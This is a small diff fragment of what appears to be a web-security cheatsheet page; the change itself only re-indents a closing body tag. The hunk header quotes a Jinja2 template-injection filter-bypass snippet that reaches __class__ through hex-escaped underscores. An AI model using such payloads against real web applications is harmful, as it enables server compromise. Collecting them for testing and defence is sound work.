@@ -1404,6 +2990,6 @@ request|attr('\x5f\x5fclass\x5f\x5f')</code></pre>
   <script defer src="js/site.js"></script>
   <script defer src="js/cheatsheet-index.js"></script>
 
-  </body>
+</body>
 
 </html>
